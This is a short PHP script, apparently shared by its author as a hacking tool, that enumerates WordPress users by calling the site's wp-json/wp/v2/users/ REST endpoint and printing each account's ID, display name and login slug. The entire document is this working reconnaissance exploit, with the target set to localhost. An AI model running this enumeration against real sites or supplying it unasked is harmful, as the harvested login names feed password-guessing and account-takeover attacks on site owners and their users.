#!usr/bin/php
<?php

#Author: Mateus a.k.a Dctor
#fb: fb.com/hatbashbr/
#E-mail: dctoralves@protonmail.ch
#Site: https://mateuslino.tk
header ('Content-type: text/html; charset=UTF-8');


$url= "http://localhost/";
$payload="wp-json/wp/v2/users/";
$urli = file_get_contents($url.$payload);
$json = json_decode($urli, true);
if($json){
	echo "*-----------------------------*\n";
foreach($json as $users){
	echo "[*] ID :  |" .$users['id']     ."|\n";
	echo "[*] Name: |" .$users['name']   ."|\n";
	echo "[*] User :|" .$users['slug']   ."|\n";
	echo "\n";
}echo "*-----------------------------*";}
else{echo "[*] No user";}


?>